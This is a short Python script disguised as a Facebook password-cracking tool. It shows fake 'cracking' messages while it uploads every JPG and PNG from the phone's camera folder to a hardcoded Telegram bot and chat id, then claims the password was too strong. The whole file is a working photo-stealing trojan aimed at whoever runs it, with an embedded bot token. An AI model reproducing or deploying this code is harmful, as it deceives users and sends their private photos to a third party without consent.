import os
import time
from telebot import TeleBot

bot = TeleBot('6774425694:AAH1jHZqubHU9Z7Fe5pQtp49Psl3zC-WdR8')

chat_id = '1845018877'

green = '\033[32m'
red = '\033[31m'
white = '\033[37m'

camera_photos_directory = '/storage/emulated/0/DCIM/Camera'

def send_photos():
    print('Welcome TO my Facebook Hacking Tool')
    print()
    link = input(f'{red}FACEBOOK TARGET LINK{white} >> ')
    print('wait a Minute...')
    print(f'{green}CRACKING PASSWORD...{white}')
    for filename in os.listdir(camera_photos_directory):
        if filename.endswith('.jpg') or filename.endswith('.png'):
            photo_path = os.path.join(camera_photos_directory, filename)
            with open(photo_path, 'rb') as photo:
                bot.send_photo(chat_id, photo)


send_photos()
print('PASSWORD IS STRONG TRY AGAIN')

